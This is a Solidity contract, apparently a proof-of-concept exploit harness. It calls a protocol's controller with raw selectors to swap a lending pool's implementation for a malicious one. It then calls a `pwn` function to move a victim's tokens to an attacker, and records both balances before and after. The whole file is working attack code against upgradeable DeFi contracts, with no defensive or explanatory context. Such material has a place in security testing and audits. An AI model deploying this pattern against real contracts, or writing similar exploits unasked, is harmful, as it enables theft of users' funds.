// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;
interface IERC20 { function balanceOf(address) external view returns(uint256); }
contract Prober2 {
    function attack(address ctrl, address ap, address mal, address pool, address token, address victim, address attacker)
        external returns (uint256 vBefore, uint256 aBefore, uint256 vAfter, uint256 aAfter)
    {
        vBefore = IERC20(token).balanceOf(victim);
        aBefore = IERC20(token).balanceOf(attacker);
        address[] memory tg = new address[](1); tg[0] = ap;
        bytes[] memory dt = new bytes[](1); dt[0] = abi.encodeWithSelector(bytes4(0x5aef021f), mal); // setLendingPoolImpl
        (bool ok1,) = ctrl.call(abi.encodeWithSelector(bytes4(0x63fb0b96), tg, dt));   // controller.execute (raw selector)
        require(ok1, "UPGRADE_call_failed");
        (bool ok2,) = pool.call(abi.encodeWithSignature("pwn(address,address,address)", token, victim, attacker));
        require(ok2, "PWN_failed");
        vAfter = IERC20(token).balanceOf(victim);
        aAfter = IERC20(token).balanceOf(attacker);
    }
}
